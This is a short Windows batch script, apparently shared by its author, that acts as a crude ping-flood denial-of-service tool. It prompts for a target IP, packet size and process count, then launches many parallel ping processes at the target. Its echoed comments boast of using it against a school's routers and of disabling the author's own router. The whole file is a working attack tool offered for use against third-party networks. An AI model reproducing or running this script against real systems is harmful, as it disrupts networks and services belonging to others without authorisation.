@echo off

echo An archaic batch file I made way back in the day.
echo If you find an ip address to direct it to it will
echo start a bunch of processes, very crudely, and start pinging the ip; 
echo Acting as a DOS attack. 
echo I would use this on our schools routers that
echo for some reason would take and process every ping I gave it. 
echo I tried it on my old router, it is no longer functional. 
echo WILL MAKE YOUR COMPUTER HAVE A SEIZURE.

set /p numAttack="Pings per process: "
set /p numProcess="Number of ping processes: "
set /p sizeByte="Bytes per ping: "
set /p target="Target IP: "
set /p warn="WARNING: This will take an inordinate amount of resources, rendering your computer unusable under certain conditions."

pause

for /L %%n in (1,1,%numProcess%) do (
	START ping -n %numAttack% -l %sizeByte% %target%
)

pause
